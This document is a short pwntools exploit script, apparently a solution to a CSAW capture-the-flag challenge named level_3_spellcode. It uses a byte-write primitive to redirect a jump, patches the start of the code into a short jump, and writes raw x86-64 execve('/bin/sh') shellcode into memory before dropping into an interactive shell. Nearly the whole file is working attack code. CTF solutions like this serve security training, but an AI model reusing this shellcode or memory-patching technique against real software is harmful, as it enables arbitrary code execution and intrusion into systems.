
# solve level_3_shellcode
# by N4T_20

from pwn import *
from time import sleep

local = True
debug = False
if local:
    if debug:
        p = gdb.debug('./level_3_spellcode',
            '''
            break runGame
            continue
            ''')
        # *0x4009c6: countershell
    else:
        #p = process('./level_3_spellcode')
        p = remote('localhost',5000)
else:
    p = remote('ctf.csaw.io', 8000)

def do_a_write(offset, value):
    p.recvuntil("(0-39): > ")
    p.send(str(offset)+"\n")
    p.recvuntil("modified byte: > ")
    p.send(chr(value))# x5f to countershell() # \xb8 to init

def change_jump_to_counterspell():
    #do_a_write(26, 0x90)
    do_a_write(36, 0x5f)

def change_initial_code_to_jump_to_end():
    do_a_write(1, 0xb0)
    do_a_write(2, 28) # guess at the moment
    do_a_write(1, 0xeb)

# https://systemoverlord.com/2014/06/05/minimal-x86-64-shellcode-for-binsh/
payload = "\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05"
def add_payload_to_bss_section(payload):
    for i in range(len(payload)):
        do_a_write(i+4,ord(payload[i]))

p.recvuntil(">")
p.send("3\n")
change_jump_to_counterspell()
change_initial_code_to_jump_to_end()
add_payload_to_bss_section(payload)
do_a_write(2,1)

p.interactive()
